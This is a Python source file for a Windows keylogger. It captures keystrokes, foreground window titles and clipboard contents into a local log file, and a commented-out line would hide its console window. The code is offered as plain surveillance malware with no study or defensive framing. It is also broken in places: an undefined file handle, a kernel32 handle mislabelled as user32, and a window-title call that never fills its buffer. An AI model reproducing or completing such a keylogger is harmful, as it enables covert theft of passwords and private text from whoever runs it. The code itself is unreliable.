import ctypes
import logging
import win32api
import win32gui
import os
import win32clipboard

kernel32 = ctypes.windll.kernel32
user32 = ctypes.windll.kernel32

# user32.ShowWindow(kernel32.GetConsoleWindow(), 0)


# Function to grab the current window and its title
def get_current_window():
    GetForegroundWindow = win32gui.GetForegroundWindow
    GetWindowTextLength = win32gui.GetWindowTextLength
    GetWindowText = win32gui.GetWindowText

    hwnd = GetForegroundWindow()
    length = GetWindowTextLength(hwnd)
    print(length)
    buff = ctypes.create_unicode_buffer(length + 1)

    GetWindowText(hwnd)  # , buff, length + 1)

    return buff.value


def get_clipboard():

    CF_TEXT = 1

    # Argument and return types for GlobalLock/GlobalUnlock.
    kernel32.GlobalLock.argtypes = [ctypes.c_void_p]
    kernel32.GlobalLock.restype = ctypes.c_void_p
    kernel32.GlobalUnlock.argtypes = [ctypes.c_void_p]

    # Return type for GetClipboardData
    user32.GetClipboardData.restype = ctypes.c_void_p
    user32.OpenClipboard(0)

    # Required clipboard functions
    IsClipboardFormatAvailable = user32.IsClipboardFormatAvailable
    GetClipboardData = user32.GetClipboardData
    CloseClipboard = user32.CloseClipboard

    try:
        if IsClipboardFormatAvailable(CF_TEXT):  # If CF_TEXT is available
            data = GetClipboardData(CF_TEXT)  # Get handle to data in clipboard
            data_locked = kernel32.GlobalLock(data)  # Get pointer to memory location where the data is located
            text = ctypes.c_char_p(data_locked)  # Get a char * pointer (string in Python) to the location of data_locked
            value = text.value  # Dump the content in value
            kernel32.GlobalUnlock(data_locked)  # Decrement de lock count
            return value.decode('utf-8')  # Return the clipboard content
    finally:
        CloseClipboard() # Close the clipboard


def get_keystrokes(log_dir, log_name):  # Function to monitor and log keystrokes

    # Logger
    logging.basicConfig(filename=log_name, level=logging.DEBUG, format='%(message)s')

    GetAsyncKeyState = win32api.GetAsyncKeyState  # WinAPI function that determines whether a key is up or down
    special_keys = {0x08: 'BS', 0x09: 'Tab', 0x10: 'Shift', 0x11: 'Ctrl', 0x12: 'Alt', 0x14: 'CapsLock', 0x1b: 'Esc', 0x20: 'Space', 0x2e: 'Del'}
    current_window = None
    line = []  # Stores the characters pressed

    while True:

        if current_window != get_current_window():  # If the content of current_window isn't the currently opened window
            current_window = get_current_window()  # Put the window title in current_window
            # logging.info(str(current_window).encode('utf-8'))  # Write the current window title in the log file
            file.write(str(current_window))

        for i in range(1, 256):  # Because there are 256 ASCII characters (even though we only really use 128)
            if GetAsyncKeyState(i) & 1:  # If a key is pressed and matches an ASCII character
                if i in special_keys:  # If special key, log as such
                    # logging.info("<{}>".format(special_keys[i]))
                    file.write(special_keys[i])
                elif i == 0x0d:  # If <ENTER>, log the line typed then clear the line variable
                    # logging.info(line)
                    file.write(line,)
                    line.clear()
                elif i == 0x63 or i == 0x43 or i == 0x56 or i == 0x76:  # If characters 'c' or 'v' are pressed, get clipboard data
                    clipboard_data = get_clipboard()
                    file.write(str(clipboard_data),)
                    # logging.info("[CLIPBOARD] {}".format(clipboard_data))
                elif 0x30 <= i <= 0x5a:  # If alphanumeric character, append to line
                    line.append(chr(i))


def main():
    log_dir = os.getcwd()  # os.environ['HOMEPATH']
    log_name = 'keyslog.txt'

    get_keystrokes(log_dir, log_name)


if __name__ == '__main__':
    main()
